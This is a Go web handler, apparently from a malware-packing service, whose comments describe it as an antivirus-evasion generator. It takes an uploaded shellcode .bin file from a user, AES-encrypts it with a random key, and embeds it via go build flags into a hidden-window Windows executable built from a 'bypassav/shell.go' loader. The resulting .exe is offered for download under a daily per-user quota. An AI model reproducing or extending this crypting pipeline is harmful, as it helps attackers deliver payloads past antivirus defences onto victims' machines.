package cmd

//生成免杀文件模块
import (
	"encoding/hex"
	"fmt"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
	"os/exec"
	"path"
	"time"
	"web/testpackage"
)

func Upload(c *gin.Context) {
	// 单个文件
	authfile, err1 := c.Cookie("FileAuth") //生成成功会留下一个cookie
	if err1 != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "出现了未知的错误",
		})
		return
	}
	if authfile != "" {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "每日一次机会已用光，请第二天再试，谢谢。",
		})
		return
	}
	ipadd := c.ClientIP() //获取ip地址
	username := c.MustGet("username").(string)
	//qq := testpackage.GetuserQQ(username)      //获取qq
	//timeStr := time.Now().Format("2006-01-02") //获取生成时间
	//runtime := c.DefaultPostForm("runtime", "5") //获取延迟时间
	file, err := c.FormFile("f1")
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "出现了错误？",
		})
		return
	}
	if path.Ext(file.Filename) != ".bin" {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "别乱搞啊，小心封ip了。",
		})
		return
	}

	err2 := testpackage.InitDB() // 调用输出化数据库的函数
	if err2 != nil {
		fmt.Printf("init db failed,err:%v\n", err1)
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "发生甚么事了？报错了！",
		})
		return
	}
	if testpackage.Authfilenub(username) >= "1" {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "每日一次机会已用光，请第二天再试，谢谢。",
		})
		return
	}
	if testpackage.SQLInject(ipadd) == true {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "你x个锤子呢,你觉得能不能x嘛。"})
		return
	}
	log.Println(file.Filename)
	nfilename := Base64EncodeString(username + ":" + fmt.Sprintf("%d", time.Now().Unix()))
	dst := fmt.Sprintf("./upload/bin/%s", nfilename+".bin")
	// 上传文件到指定的目录
	aeskey := RandNewStr(16) //生成随机aeskey
	c.SaveUploadedFile(file, dst)
	key := []byte(aeskey) //aeskey
	code := Readcode("./upload/bin/" + nfilename + ".bin")

	//descode, err := Encrypt(ncode, key) //前半段进行des加密
	aescode := AESEncrypt([]byte(code), key)
	ncode := hex.EncodeToString(aescode)

	//if len(code) < 600 || len(code) > 1100 {
	//	c.JSON(http.StatusInternalServerError, gin.H{
	//		"status":  500,
	//		"message": "请上传正常的payload文件。",
	//	})
	//	return
	//}
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": err.Error(),
		})
		return
	} else {
		if testpackage.Authfilenub(username) >= "1" {
			c.JSON(http.StatusInternalServerError, gin.H{
				"status":  500,
				"message": "每日一次机会已用光，请第二天再试，谢谢。",
			})
			return
		}

		cmd := exec.Command("go", "build", "-o", "./getshell/"+nfilename+".exe", "-ldflags", "-s -w  -H=windowsgui  -X main.code="+ncode+" -X main.key="+aeskey+"", "./payload/bypassav/shell.go")
		err1 := cmd.Run()
		if err1 != nil {
			// 命令执行失败
			fmt.Println(err1)
		}
		filetype := "bypass简单免杀"
		if Reshell("./getshell/"+nfilename+".exe") == true {
			if testpackage.FileAdd(username, nfilename, ipadd, filetype) == true {
				c.JSON(http.StatusOK, gin.H{
					"status":  200,
					"durl":    "/shell/" + nfilename + ".exe",
					"message": fmt.Sprintf("生成成功,点击跳转下载。"),
				})
			} else {
				c.JSON(http.StatusInternalServerError, gin.H{
					"status":  500,
					"message": fmt.Sprintf("生成错误，请重新尝试。"),
				})
			}
		} else {
			c.JSON(http.StatusInternalServerError, gin.H{
				"status":  500,
				"message": fmt.Sprintf("生成错误，请重新尝试。"),
			})
		}
	}
}